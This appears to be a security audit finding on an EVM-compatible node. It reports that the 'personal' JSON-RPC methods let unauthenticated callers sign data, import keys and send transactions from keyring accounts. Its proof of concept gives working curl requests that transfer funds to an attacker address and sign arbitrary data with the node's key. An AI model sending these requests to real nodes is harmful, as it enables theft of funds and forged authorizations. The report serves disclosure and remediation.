### Title
Unauthenticated `personal_sign` and `personal_sendTransaction` Allow Arbitrary Signing and Unauthorized Fund Transfer When Personal Namespace Is Enabled — (File: `rpc/namespaces/ethereum/personal/api.go`)

---

### Summary

When the `personal` JSON-RPC namespace is enabled, `personal_sign` and `personal_sendTransaction` accept calls from any unauthenticated HTTP client with no per-request credential check, user confirmation, or origin gating. Any attacker who can reach the JSON-RPC port can sign arbitrary Ethereum messages with the node's private key or submit transactions that drain the node's keyring accounts.

---

### Finding Description

`PrivateAccountAPI` in `rpc/namespaces/ethereum/personal/api.go` exposes four sensitive operations — `ImportRawKey`, `ListAccounts`, `Sign`, and `SendTransaction` — none of which perform any authentication before executing:

```go
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)   // no auth check
}

func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)  // no auth check
}
``` [1](#0-0) [2](#0-1) 

The namespace is registered with `Public: false`, but in go-ethereum's RPC framework this flag only controls whether the namespace appears in `rpc_modules` responses — it does **not** gate method invocations. Any caller who can POST to the JSON-RPC endpoint can invoke every `personal_*` method when the namespace is listed in the server's API config. [3](#0-2) 

The `personal` namespace is absent from the default API list:

```go
func GetDefaultAPINamespaces() []string {
    return []string{"eth", "net", "web3"}
}
``` [4](#0-3) 

However, `GetAPINamespaces()` explicitly lists `"personal"` as an available namespace, and operators are documented to enable it: [5](#0-4) 

The backend implementations confirm there is no authentication layer between the RPC handler and the keyring:

```go
func (b *Backend) ListAccounts() ([]common.Address, error) {
    list, err := b.clientCtx.Keyring.List()   // direct keyring read, no auth
    ...
}
``` [6](#0-5) 

---

### Impact Explanation

**`personal_sendTransaction`**: An unauthenticated attacker sends a crafted JSON-RPC request specifying `from` as any address in the node's keyring and `to` as an attacker-controlled address. `backend.SendTransaction` signs and broadcasts the transaction through the normal EVM execution path, transferring EVM-denom funds from the node's account to the attacker. This is a direct, unauthorized balance transfer of EVM-denom funds — matching the Critical impact class.

**`personal_sign`**: An attacker requests the node to sign arbitrary bytes (e.g., an EIP-712 typed-data payload or a raw transaction hash) with any keyring address. The resulting signature can be replayed to authorize on-chain actions, matching the High impact class for forged authorization.

**`personal_importRawKey`**: An attacker injects a private key they control into the node's keyring, enabling subsequent signing operations under a key the attacker already knows.

---

### Likelihood Explanation

- The `personal` namespace is not enabled by default, which is the primary mitigating factor.
- However, it is explicitly listed as an available namespace and is commonly enabled by operators for development, testing, or dapp-compatibility purposes.
- The JSON-RPC port (default `0.0.0.0:8545`) is frequently exposed publicly or to internal networks without additional authentication middleware.
- No code-level safeguard (IP allowlist, token check, TLS client cert) is enforced by the `personal` namespace itself; protection relies entirely on network-level controls the operator may not have applied.
- The `personal_unlockAccount` stub returns `false` without error, giving operators a false sense that account locking is enforced. [7](#0-6) 

---

### Recommendation

1. **Deprecate or remove** the `personal` namespace from production builds, consistent with go-ethereum's own deprecation of `personal_*` APIs.
2. If retained, gate every `personal_*` handler behind a per-request authentication check (e.g., a shared secret header, JWT, or IPC-only transport) before the call reaches the backend.
3. Ensure `personal` is never included in `GetDefaultAPINamespaces()` and add a startup warning when it is explicitly enabled.
4. Document clearly that enabling `personal` on a publicly reachable endpoint is equivalent to exposing an unauthenticated key-management interface.

---

### Proof of Concept

```bash
# Attacker sends a transaction from the node's validator key to their own address
curl -s -X POST http://<node-ip>:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"personal_sendTransaction",
    "params":[{
      "from":"0x<node-keyring-address>",
      "to":"0x<attacker-address>",
      "value":"0xDE0B6B3A7640000"
    }, ""],
    "id":1
  }'
# Returns a transaction hash; funds are transferred with no user confirmation.

# Attacker signs arbitrary EIP-712 data with the node's key
curl -s -X POST http://<node-ip>:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"personal_sign",
    "params":["0xdeadbeef","0x<node-keyring-address>",""],
    "id":2
  }'
# Returns a valid secp256k1 signature over attacker-chosen data.
```

The node keyring address is trivially obtained beforehand via `eth_accounts` (enabled by default in the `eth` namespace) or `personal_listAccounts`. [8](#0-7) [9](#0-8)

// Accounts returns the list of accounts available to this node.
func (b *Backend) Accounts() ([]common.Address, error) {
	addresses := make([]common.Address, 0) // return [] instead of nil if empty

	infos, err := b.clientCtx.Keyring.List()
	if err != nil {
		return addresses, err
	}

	for _, info := range infos {
		pubKey, err := info.GetPubKey()
		if err != nil {
			return nil, err
		}
		addressBytes := pubKey.Address().Bytes()
		addresses = append(addresses, common.BytesToAddress(addressBytes))
	}

	return addresses, nil
}
```
